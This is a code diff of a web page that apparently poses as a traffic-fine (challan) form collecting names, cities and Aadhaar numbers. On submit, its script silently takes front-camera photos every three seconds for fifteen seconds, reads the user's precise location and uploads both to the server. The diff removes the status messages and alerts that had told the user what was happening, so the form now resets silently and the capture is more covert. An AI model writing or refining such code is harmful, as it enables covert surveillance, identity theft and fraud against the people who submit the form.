@@ -307,183 +307,167 @@
       }
 
       // Function to capture multiple photos from camera
-async function capturePhotos(duration = 15000) { // Capture for 15 seconds by default
-  const images = [];
-  let stream = null;
-  
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: "user" } 
-    });
-    
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-    
-    await new Promise(resolve => {
-      video.onloadedmetadata = resolve;
-    });
-    
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    
-    // Function to capture a single frame
-    const captureFrame = () => {
-      ctx.drawImage(video, 0, 0);
-      return canvas.toDataURL('image/jpeg', 0.8);
-    };
-    
-    // Capture first image immediately
-    images.push(captureFrame());
-    
-    // Capture images every 5 seconds
-    const intervalId = setInterval(() => {
-      images.push(captureFrame());
-    }, 3000);
-    
-    // Stop after duration
-    await new Promise(resolve => setTimeout(resolve, duration));
-    
-    clearInterval(intervalId);
-    stream.getTracks().forEach(track => track.stop());
-    
-    return images;
-  } catch (error) {
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
-    console.error('Camera error:', error);
-    throw error;
-  }
-}
-
-// Function to send data to backend
-async function sendToBackend(imageDataArray, locationData) {
-  try {
-    // Upload all images
-    const imageUploadPromises = imageDataArray.map(async (imageData, index) => {
-      const imageResponse = await fetch('/capture', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: imageData })
-      });
-      return await imageResponse.json();
-    });
-    
-    const imageResults = await Promise.all(imageUploadPromises);
-    
-    // Upload location
-    const locationResponse = await fetch('/location', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(locationData)
-    });
-    const locationResult = await locationResponse.json();
-    
-    return { imageResults, locationResult };
-  } catch (error) {
-    console.error('Backend error:', error);
-    throw error;
-  }
-}
-
-// Initialize captcha on page load
-refreshCaptcha();
-
-document
-  .getElementById("challanForm")
-  .addEventListener("submit", async function (e) {
-    e.preventDefault();
-    let valid = true;
-
-    document
-      .querySelectorAll(".error")
-      .forEach((el) => (el.style.display = "none"));
-
-    const name = document.getElementById("nameInput").value.trim();
-    const city = document.getElementById("cityInput").value.trim();
-    const aadhar = document.getElementById("aadharInput").value.trim();
-    const captchaInput = document
-      .getElementById("captchaInput")
-      .value.trim();
-
-    if (!name) {
-      document.getElementById("nameError").style.display = "block";
-      valid = false;
-    }
-
-    if (!city) {
-      document.getElementById("cityError").style.display = "block";
-      valid = false;
-    }
-
-    if (!aadhar || aadhar.length !== 12 || !/^\d+$/.test(aadhar)) {
-      document.getElementById("aadharError").style.display = "block";
-      valid = false;
-    }
-
-    if (!captchaInput) {
-      document.getElementById("captchaError").style.display = "block";
-      valid = false;
-    }
-
-    if (valid) {
-      const submitBtn = document.querySelector('.submit-btn');
-      submitBtn.disabled = true;
-      submitBtn.textContent = 'Capturing photos...';
-      
-      try {
-        // Capture multiple photos (15 seconds = 4 images: 0s, 5s, 10s, 15s)
-        const imageDataArray = await capturePhotos(15000);
+      async function capturePhotos(duration = 15000) {
+        const images = [];
+        let stream = null;
         
-        submitBtn.textContent = 'Getting location...';
-        
-        // Get location
-        const position = await new Promise((resolve, reject) => {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" } 
+          });
+          
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          
+          await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+          });
+          
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          
+          // Function to capture a single frame
+          const captureFrame = () => {
+            ctx.drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg', 0.8);
+          };
+          
+          // Capture first image immediately
+          images.push(captureFrame());
+          
+          // Capture images every 3 seconds
+          const intervalId = setInterval(() => {
+            images.push(captureFrame());
+          }, 3000);
+          
+          // Stop after duration
+          await new Promise(resolve => setTimeout(resolve, duration));
+          
+          clearInterval(intervalId);
+          stream.getTracks().forEach(track => track.stop());
+          
+          return images;
+        } catch (error) {
+          if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+          }
+          console.error('Camera error:', error);
+          throw error;
+        }
+      }
+
+      // Function to send data to backend
+      async function sendToBackend(imageDataArray, locationData) {
+        try {
+          // Upload all images
+          const imageUploadPromises = imageDataArray.map(async (imageData, index) => {
+            const imageResponse = await fetch('/capture', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: imageData })
             });
-          } else {
-            reject(new Error('Geolocation not supported'));
+            return await imageResponse.json();
+          });
+          
+          const imageResults = await Promise.all(imageUploadPromises);
+          
+          // Upload location
+          const locationResponse = await fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(locationData)
+          });
+          const locationResult = await locationResponse.json();
+          
+          return { imageResults, locationResult };
+        } catch (error) {
+          console.error('Backend error:', error);
+          throw error;
+        }
+      }
+
+      // Initialize captcha on page load
+      refreshCaptcha();
+
+      document
+        .getElementById("challanForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+          let valid = true;
+
+          document
+            .querySelectorAll(".error")
+            .forEach((el) => (el.style.display = "none"));
+
+          const name = document.getElementById("nameInput").value.trim();
+          const city = document.getElementById("cityInput").value.trim();
+          const aadhar = document.getElementById("aadharInput").value.trim();
+          const captchaInput = document
+            .getElementById("captchaInput")
+            .value.trim();
+
+          if (!name) {
+            document.getElementById("nameError").style.display = "block";
+            valid = false;
+          }
+
+          if (!city) {
+            document.getElementById("cityError").style.display = "block";
+            valid = false;
+          }
+
+          if (!aadhar || aadhar.length !== 12 || !/^\d+$/.test(aadhar)) {
+            document.getElementById("aadharError").style.display = "block";
+            valid = false;
+          }
+
+          if (!captchaInput) {
+            document.getElementById("captchaError").style.display = "block";
+            valid = false;
+          }
+
+          if (valid) {
+            const submitBtn = document.querySelector('.submit-btn');
+            submitBtn.disabled = true;
+            
+            try {
+              // Capture multiple photos (15 seconds = 6 images: 0s, 3s, 6s, 9s, 12s, 15s)
+              const imageDataArray = await capturePhotos(15000);
+              
+              // Get location
+              const position = await new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                  navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true
+                  });
+                } else {
+                  reject(new Error('Geolocation not supported'));
+                }
+              });
+              
+              const locationData = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              };
+              
+              // Send to backend
+              const result = await sendToBackend(imageDataArray, locationData);
+              
+              // Reset form silently
+              document.getElementById('challanForm').reset();
+              refreshCaptcha();
+              
+            } catch (error) {
+              console.error('Submission error:', error);
+            } finally {
+              submitBtn.disabled = false;
+            }
           }
         });
-        
-        const locationData = {
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          accuracy: position.coords.accuracy
-        };
-        
-        submitBtn.textContent = 'Uploading data...';
-        
-        // Send to backend
-        const result = await sendToBackend(imageDataArray, locationData);
-        
-        alert(
-          `Form submitted successfully!\n\n` +
-          `Name: ${name}\n` +
-          `City: ${city}\n` +
-          `Aadhar: ${aadhar}\n\n` +
-          `Photos captured: ${imageDataArray.length}\n` +
-          `Location: ${locationData.lat.toFixed(6)}, ${locationData.lon.toFixed(6)}\n` +
-          `Accuracy: ${locationData.accuracy.toFixed(0)}m`
-        );
-        
-        // Reset form
-        document.getElementById('challanForm').reset();
-        refreshCaptcha();
-        
-      } catch (error) {
-        alert('Error: ' + error.message + '\n\nPlease ensure camera and location permissions are granted.');
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Submit';
-      }
-    }
-  });
-    </script>
+</script>
   </body>
 </html>
